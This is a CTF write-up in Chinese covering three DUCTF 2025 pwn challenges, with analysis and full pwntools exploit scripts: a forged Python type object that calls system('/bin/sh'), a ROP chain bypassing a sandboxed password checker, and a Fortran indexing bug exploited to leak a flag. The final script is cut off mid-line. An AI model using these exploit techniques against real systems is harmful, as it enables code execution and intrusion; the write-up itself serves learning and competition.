fakeobj题目描述Dear MNGA, send me your best fake snake object Regards,joseph 题目功能12345678910111213141516#!/usr/bin/env python3import ctypesobj = &#123;&#125;print(f&quot;addrof(obj) = &#123;hex(id(obj))&#125;&quot;)libc = ctypes.CDLL(None)system = ctypes.cast(libc.system, ctypes.c_void_p).valueprint(f&quot;system = &#123;hex(system or 0)&#125;&quot;)fakeobj_data = bytes.fromhex(input(&quot;fakeobj: &quot;))for i in range(72): ctypes.cast(id(obj), ctypes.POINTER(ctypes.c_char))[i] = fakeobj_data[i]print(obj) 题目给出了 obj 对象的地址和 system 函数的地址，然后读入 72 字节，写入 obj 对象的位置 利用思路参考资料：Exploiting a Use-After-Free for code execution in every version of Python 3 从中可以知道 python 对象基本结构体如下： 1234typedef struct _object &#123; Py_ssize_t ob_refcnt; PyTypeObject *ob_type;&#125; PyObject; ob_refcnt 是引用计数，ob_type 指向对象所属的类型结构体 PyTypeObject而 PyTypeObject 结构体中存在 vtable，有很多函数指针可以劫持 因为知道了 obj 的地址，所以可以在 object head 下面伪造一个 PyTypeObject 并让 ob_type 指向伪造的结构体 经过调试发现，print(obj) 时第一个调用的 vtable 的函数指针应该是 PyTypeObject-&gt;tp_str 这个函数指针在 PyTypeObject 中偏移 0x88 ，被函数 PyObject_Str 调用 https://github.com/python/cpython/blob/1e672935b44e084439527507a865b94a4c1315c3/Objects/object.c#L822 1res = (*Py_TYPE(v)-&gt;tp_str)(v); 题目限制只能读入 72 字节，所以 ob_type 设置为 &amp;fake_PyTypeObject - 0x88，使得 tp_str 正好落在 obj+0x10 的位置，紧跟在 ob_type 后，设置为 system 因为调用这个函数指针的第一个参数是 _object 的地址，所以篡改 ob_refcnt 为 /bin/sh\x00，又因为引用计数会在运行时 +1 ，所以第一个字节要 -1 ，变成 ./bin/sh\x00 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#!/usr/bin/env python&quot;&quot;&quot; author: St4ckC00ki3&quot;&quot;&quot;from pwncli import *filename = &quot;/usr/bin/python3&quot;libcname = &quot;&quot;host = &quot;chal.2025.ductf.net&quot;port = 30001elf = context.binary = ELF(filename)context.terminal = [&quot;tmux&quot;, &quot;neww&quot;]context.log_level = &quot;debug&quot;if libcname != &quot;&quot;: libc = ELF(libcname)gs = &quot;&quot;&quot;b *0x5856e0b *0x585780&quot;&quot;&quot;def start(): if args.GDB: return gdb.debug([elf.path, &quot;fakeobj.py&quot;], gdbscript=gs) elif args.REMOTE: return remote(host, port) else: return process([elf.path, &quot;fakeobj.py&quot;])p = start()def leak_address(): if context.arch == &quot;i386&quot;: return u32(p.recv(4)) else: return u64(p.recv(6).ljust(8, b&quot;\x00&quot;))def leak_address2(timeout=0.2): contains = b&quot;\x7f&quot; if context.bits == 64 else b&quot;\xf7&quot; m = p.recvuntil(contains, timeout=timeout) if contains not in m: raise RuntimeError(&quot;Cannot get libc addr&quot;) if context.bits == 32: return u32(m[-4:]) else: return u64(m[-6:])def dbg(): if args.AT: gdb.attach(p, gs) pause()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x, y: p.sendafter(x, y)sla = lambda x, y: p.sendlineafter(x, y)r = lambda x: p.recv(x)ru = lambda x: p.recvuntil(x)rl = lambda x: p.recvline(x)ia = lambda: p.interactive()op32 = make_packer(32, endian=&quot;big&quot;, sign=&quot;unsigned&quot;) # opposite p32op64 = make_packer(64, endian=&quot;big&quot;, sign=&quot;unsigned&quot;) # opposite p64# Your exploit heredef exp(): ru(b&#x27;addrof(obj) = &#x27;) obj_addr = int(p.recvuntil(&#x27;
&#x27;, True), 16) leak_ex2(obj_addr) ru(b&#x27;system = &#x27;) system = int(p.recvuntil(&#x27;
&#x27;, True), 16) leak_ex2(system) ru(b&#x27;fakeobj: &#x27;) pay = flat( b&quot;.bin/sh&quot;.ljust(8, b&#x27;\x00&#x27;), # refcount, p64(obj_addr-0x88+0x10), # pointer to fake type object system ) pay = pay.ljust(72, b&#x27;\x00&#x27;) sl(pay.hex()) ia()exp() Mysterious Vault题目描述Dear MNGA, You’ve discovered a mysterious vault exposed on a server - surely, if you can break in, great rewards will follow… Regards,ItsIronicIInsist 题目功能出题人好心的提供了源代码 主程序 mysterious_vault 先读入密码到共享内存，然后 fork 后 execve 启动两个子进程 password_handler_3000 和 password_handler_3001 ，启动前还分别为两个子进程 chroot 隔离环境，使得他们只能分别读取到 checker1-trusted-env/ 和 checker2-trusted-env/ 中的文件 3000 和 3001 都是由源码 password_handler_300X.c 静态编译而来，但 3000 是使用的 gcc，而 3001 使用的 clang 子进程先启动了沙盒 并且关掉了 标准输入、输出、错误 然后从共享内存中拷贝密码，对密码检查，不通过的话返回 1 错误码告知主进程，主进程失败结束。 如果两个 handler 的退出码为 0 即检查通过，mysterious_vault 会直接把共享内存当作密码拿出来进行检查（之前一直是共享内存 + 0x8 为密码），这次是和真正的密码字符串 memcmp，如果通过会调用 get_flag 打印出 flag。 漏洞点 密码长度最大为 0x200，而子程序的 password 仅有 200 字节大小，从共享内存拷贝时栈溢出。 handler 的检查可以用 ‘\x00’截断绕过 1if (strcspn(password, &quot;password&quot;) != strlen(password)) &#123; 利用思路exit 中会先 syscall exit_group ，这导致即使是正常情况下两个 handler 都会因为违反沙盒规则而 SIGSYS 异常终止 并且 3000 和 3001 的栈布局不同，返回地址的偏移 3001 在 3000 之前，gadget 也不同 而经过调试我发现 3001 中有 gadget 等效于 exit($rbp-4) 只要控制 *($rbp-4) 为 0即可 123.text:000000000041C598 mov esi, [rbp-4].text:000000000041C59B mov edi, 3Ch ; sys_exit.text:000000000041C5A0 call sub_401980 ; syscall 而 3000 需要用 rop 链从 checker1-trusted-env/password 真密码文件中读取前 0x8 字节到共享内存的开头，把之前用作存储密码长度占用的 0x8 字节修复为真密码。 #!/usr/bin/env python&quot;&quot;&quot; author: St4ckC00ki3&quot;&quot;&quot;from pwncli import *filename = &quot;mysterious_vault&quot;libcname = &quot;&quot;host = &quot;chal.2025.ductf.net&quot;port = 30019elf = context.binary = ELF(filename)context.terminal = [&quot;tmux&quot;, &quot;neww&quot;]context.log_level = &quot;debug&quot;if libcname != &quot;&quot;: libc = ELF(libcname)gs = &quot;&quot;&quot;set follow-fork-mode child&quot;&quot;&quot;def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path)p = start()def leak_address(): if context.arch == &quot;i386&quot;: return u32(p.recv(4)) else: return u64(p.recv(6).ljust(8, b&quot;\x00&quot;))def leak_address2(timeout=0.2): contains = b&quot;\x7f&quot; if context.bits == 64 else b&quot;\xf7&quot; m = p.recvuntil(contains, timeout=timeout) if contains not in m: raise RuntimeError(&quot;Cannot get libc addr&quot;) if context.bits == 32: return u32(m[-4:]) else: return u64(m[-6:])def dbg(): if args.AT: gdb.attach(p, gs) pause()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x, y: p.sendafter(x, y)sla = lambda x, y: p.sendlineafter(x, y)r = lambda x: p.recv(x)ru = lambda x: p.recvuntil(x)rl = lambda x: p.recvline(x)ia = lambda: p.interactive()op32 = make_packer(32, endian=&quot;big&quot;, sign=&quot;unsigned&quot;) # opposite p32op64 = make_packer(64, endian=&quot;big&quot;, sign=&quot;unsigned&quot;) # opposite p64# Your exploit heredef cmd(i): sla(&quot;&quot;, i)def add(size,msg): cmd(&#x27;1&#x27;) ru(&#x27;&#x27;) s(str(size)) ru(&#x27;&#x27;) s(msg)def edit(idx,msg): cmd(&#x27;2&#x27;) ru(&#x27;&#x27;) s(str(idx)) ru(&#x27;&#x27;) s(msg)def show(idx): cmd(&#x27;3&#x27;) ru(&#x27;&#x27;) s(str(idx))def dele(idx): cmd(&#x27;4&#x27;) ru(&#x27;&#x27;) s(str(idx))def exp(): ru( b&#x27;ACCESS REQUIRED. ENTER USERNAME: &#x27;) s(&quot;admin&quot;) ru( b&#x27;ENTER PASSCODE: &#x27;) ret_3001 = 0x04012A8 pop_rdi = 0x0000000000402371 pop_rsi = 0x0000000000404fe2 pop_rdx_rbx = 0x0000000000456df7 pop_rax = 0x0000000000418462 syscall = 0x0418e10 syscall_gadget = 0x418e27 # pay = flat( # b&quot;\x00&quot;.ljust(0xd0,b&#x27;\x00&#x27;), # 0x0000000000456df7, # 3001 rbp = bss # 0x4017DA ,# 3001 ret # pop_rdi, # 3000 ret # ) passwd = b&quot;\x31\xd2\x48\x8d\x35\x1c\x00\x00\x00\x80\xfa\x1b\x7d\x0a\x80\x36\x42\xfe\xc2\x48\xff\xc6\xeb\xf1\xbf\x01\x00\x00\x00\x48\x29\xd6\x89\xf8\x0f\x05\xc3\x1b\x2d\x37\x62\x24\x2d\x37\x2c\x26\x62\x36\x2a\x27\x62\x27\x23\x31\x36\x27\x30\x62\x27\x25\x25\x62\x78\x6b&quot; pay = flat( passwd[8:].ljust(0xd0-0x10,b&#x27;\x00&#x27;), b&quot;password\x00&quot;.ljust(0x10, b&#x27;\x00&#x27;), 0x0000000000456df7, # 3001 rbp = bss 0x041C598,# 3001 ret = sys_exit(rbp-4) 0xdeadbeef, # 3000 rbp # 3000 ret # sys_open(&quot;password&quot;,0) pop_rdi, 2, pop_rsi, 0x1337000+0xc8, pop_rdx_rbx, 0, 0, syscall, # sys_read(fd, shared_buf, 0x8) pop_rax, 0, pop_rdi, 0, pop_rsi, 0x1337000, pop_rdx_rbx, 8, 0, syscall_gadget, # sys_exit(0) pop_rdi, 60, pop_rsi, 0, syscall ) s(pay) ia()exp() BLAST题目描述Dear MNGA, BEGIN TRANSMISSION I HEARD ALL THE BEST MATRIX LIBRARIES WERE WRITTEN IN FORTRAN SO I TRIED MY HAND AT IMPLEMENTING MY OWN. FOR SOME REASON IT KEEPS CRASHING THOUGH?END TRANSMISSION Regards,wednesday 漏洞点FORTRAN 语言的数组下标从 1 开始而非 0，而题目中数组操作都是从下标 0 开始遍历，导致可以泄露&#x2F;写矩阵之前的内存。 flag 读取到 bss 了 功能1和3 配合能泄露 栈地址和 pie功能2 栈溢出，刚好能控制 rbp 和返回地址 利用思路位于 0x1DEE 的 gadget，可以泄露 $rbp-0x10-17 处的 16字节内存内容 123456.text:0000000000001DEE lea rdx, p_n ; p_n.text:0000000000001DF5 lea rcx, p_m.text:0000000000001DFC lea rax, [rbp+p_a].text:0000000000001E00 mov rsi, rcx ; p_m.text:0000000000001E03 mov rdi, rax ; p_a.text:0000000000001E06 call print_matrix_ 通过这个 gadget，控制 $rbp-0x10-17 为 bss 上的 flag 来泄露flag 需要多次访问，每次泄露16字节的flag EXPCredit：@LittFlower: 矩阵逆运算，泄露地址和达成栈溢出部分 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *from sys import argvfrom sage.all import *proc = &quot;./main&quot;context.log_level = &quot;debug&quot;context.binary = proccontext.terminal = [&quot;tmux&quot;, &quot;neww&quot;]elf = ELF(proc, checksec=False)flag = &quot;&quot;def exp(offset): global flag io = remote(&quot;chal.2025.ductf.net&quot;, 30002) if args.R else process(proc) if args.G: gdb.attach(io, &quot;&quot;&quot; bbase 0x00000001620 &quot;&quot;&quot;) def choose(idx): io.sendlineafter(b&quot;&gt; 
&quot;, str(idx).encode()) choose(1) b = io.recvuntil(b&quot;MENU:&quot;, drop=True).split(b&quot;
&quot;)[1:-1] b = [(int(i.lstrip().decode())) for i in b] print(b) choose(3) tmp_A = io.recvuntil(b&quot;MENU:&quot;, drop=True).split(b&quot;
&quot;)[:-1] A_list = [(int((i.lstrip().decode()))) for i in tmp_A] print(A_list) B_list = [0, 211, 48, 39, 252, 19, 2, 2, 144, 105, 250, 228, 146, 192, 206, 216, 81, 211, 48, 39, 252, 19, 2, 2, 144, 105, 250, 228, 146, 192, 206, 216, 81, 61, 194, 94, 64, 108, 106, 230, 14, 96, 251, 55, 120, 152, 248, 93, 174, 81, 82, 46, 173, 222, 167, 219, 206, 87, 141, 82, 213, 164, 39, 188, 246, 128, 1, 112, 106, 197, 121, 22, 134, 49, 173, 192, 166, 100, 22, 222, 244, 107, 130, 156, 154, 207, 9, 24, 76, 238, 172, 134, 105, 41, 203, 42, 255, 23, 160, 180, 2, 37, 15, 100, 132, 92, 233, 63, 139, 216, 36, 146, 206, 97, 14, 85, 193, 139, 79, 3, 137, 90, 190, 229, 63, 251, 99, 200, 194, 133, 83, 164, 196, 54, 184, 168, 28, 138, 69, 94, 92, 171, 160, 60, 228, 198, 247, 10, 180, 57, 79, 11, 5, 95, 129, 79, 103, 56, 229, 130, 237, 163, 126, 30, 114, 18, 223, 138, 157, 96, 135, 54, 190, 26, 241, 190, 151, 97, 88, 123, 181, 153, 223, 192, 42, 218, 177, 114, 222, 226, 114, 194, 65, 239, 62, 239, 185, 140, 176, 176, 81, 41, 17, 111, 25, 202, 231, 161, 132, 110, 194, 140, 125, 225, 163, 85, 169, 167, 167, 159, 111, 164, 93, 50, 170, 70, 192, 179, 46, 207, 203, 40, 143, 100, 21, 179, 233, 204, 144, 203, 238, 17, 196, 174, 228, 4, 229, 90, 254, 122, 34, 64, 38, 99, 165, 132] B = matrix(Zmod(256), 16, 16, B_list) B = B.T B_inv = B.inverse() A = matrix(Zmod(256), 16, 1, A_list) C = B_inv * A % 256 stack_addr = u64(bytes(C.list()[1:9])) pie_addr = u64(bytes(C.list()[9:]).ljust(8, b&quot;\x00&quot;)) - 0x1d1f - 0xcf print(f&quot;pie_addr =&gt; &#123;hex(pie_addr)&#125;
stack_addr =&gt; &#123;hex(stack_addr)&#125;&quot;) choose(2) target_addr = pie_addr + 0x1dee print(f&quot;target: &#123;hex(target_addr)&#125;&quot;) C_list = [0] for i in range(15): # rbp + retaddr C_list.append((p64(pie_addr+0x40c0+0x10+17+16*offset) + p64(target_addr))[i]) C = matrix(Zmod(256), 16, 1, C_list) # 求解 C，使得 A = B * C ⇒ C = B^&#123;-1&#125; * A A = B_inv * C % 256 print(A) # A = [174, 128, 87, 7, 126, 64, 134, 137, 47, 30, 168, 225, 162, 130, 231, 181] for i in A.list(): io.sendline(str(i).encode()) flag_part = io.recvuntil(b&quot;MENU:
